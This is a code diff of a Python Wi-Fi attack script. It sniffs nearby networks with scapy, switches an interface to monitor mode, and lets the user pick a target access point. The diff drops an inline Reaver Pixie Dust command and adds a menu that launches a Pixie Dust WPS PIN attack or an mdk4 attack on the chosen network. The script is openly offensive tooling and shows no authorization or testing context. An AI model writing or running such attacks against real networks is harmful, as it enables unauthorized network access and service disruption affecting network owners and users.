@@ -1,45 +1,44 @@
-# -*- coding: utf-8 -*-
-# Script to scan Wi-Fi networks and run Pixie Dust attack using Reaver
-'''
-MIT License
-
-Copyright (c) 2025 Alex
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-'''
-from scapy.all import sniff, Dot11, Dot11Elt
 import subprocess
+import shlex
+import os 
+from scapy.all import sniff, Dot11, Dot11Elt
+from scripts.ifmonitordown import monitor_up
+from scripts.commands import run_pixie_dust
+from scripts.commands import run_mdk4
 
-interface = input("Enter the interface to use (e.g., wlan0): ")
 
-# Enable monitor mode
-subprocess.call(f"sudo ifconfig {interface} down", shell=True)
-subprocess.call(f"sudo iwconfig {interface} mode monitor", shell=True)
-subprocess.call(f"sudo ifconfig {interface} up", shell=True)
+while True:
+    try:
+        # Check if the script is run with root priviileges
+        if os.geteuid() != 0:
+            print("This script must be run as root. Please use 'sudo'.")
+            exit(1)
+        break
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        exit(1)
+    
+while True:
+    interface = input("Enter the interface name: ")
+    # Check if the interface exists
+    if os.path.exists(f"/sys/class/net/{interface}"):
+        break
+    else:
+        print(f"Interface '{interface}' does not exist. Please enter a valid interface name.")
+# Monitor mode
+monitor_up(interface)
 
+#Wifi networks list
 networks = []
 
 def get_channel(pkt):
     elt = pkt.getlayer(Dot11Elt)
     while elt:
         if elt.ID == 3:
-            return ord(elt.info)
+            #return ord(elt.info)
+            if elt.info and len(elt.info) >= 1:
+                return elt.info[0]
+
         elt = elt.payload.getlayer(Dot11Elt)
     return None
 
@@ -71,21 +70,25 @@ except (ValueError, IndexError):
     print("Invalid selection.")
     exit(1)
 
-command_pixie_dust = f"reaver -i {interface} -b {target['BSSID']} -c {target['Channel']} -K 1 -f -vvv"
-
-def run_pixie_dust():
+# Display select methods
+while True:
     try:
-        print("\nRunning Pixie Dust attack...")
-        process = subprocess.Popen(command_pixie_dust, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate()
+        print("\nChoose an attack method:")
+        print("1. Pixie Dust")
+        print("2. mdk4")
+        print("3. Exit")
+        option = input("Choose attack method: ")
 
-        if process.returncode == 0:
-            print("Pixie Dust attack completed successfully.")
-            print(stdout.decode())
+        if option == '1':
+            run_pixie_dust(interface, target)
+        elif option == '2':
+            run_mdk4(interface, target)
+        elif option == '3':
+            print("Exiting.")
+            subprocess.call(shlex.split(f"sudo airmon-ng stop {interface}"))
+            break
         else:
-            print("Error during Pixie Dust attack:")
-            print(stderr.decode())
-    except Exception as e:
-        print(f"An error occurred: {e}")
-
-run_pixie_dust()
+            print("Invalid option.")
+    except KeyboardInterrupt:
+        print("\nExiting...")
+        break
